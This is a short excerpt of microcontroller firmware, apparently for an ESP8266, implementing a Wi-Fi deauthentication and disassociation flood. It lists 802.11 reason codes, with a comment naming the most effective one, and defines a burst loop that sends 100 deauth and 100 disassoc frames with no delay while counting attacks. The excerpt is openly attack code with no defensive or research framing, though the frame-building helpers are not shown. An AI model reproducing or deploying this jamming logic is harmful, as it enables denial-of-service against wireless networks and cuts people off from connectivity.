...
// 0x03 = STA_LEAVING is MOST EFFECTIVE
static const uint16_t reasonCodes[] = {
  0x0001, 0x0003, 0x0004, 0x0005, 0x0007, 0x0008, 0x0009
};
...
// One burst = 100 deauth + 100 disassoc (continuous)
void sendBurst() {
  // Ensure WiFi mode before sending
  wifi_set_opmode(STATIONAP_MODE);
  
  // Deauth burst - NO DELAY
  for (int i = 0; i < BURST_SIZE; i++) {
    sendDeauthFrame();
    reasonIdx = (reasonIdx + 1) % REASON_COUNT;
    attackCount++;
  }
  // Disassoc burst - NO DELAY
  for (int i = 0; i < BURST_SIZE; i++) {
    sendDisassocFrame();
    reasonIdx = (reasonIdx + 1) % REASON_COUNT;
    attackCount++;
  }
  // Minimal yield only - no delay!
  yield();
}
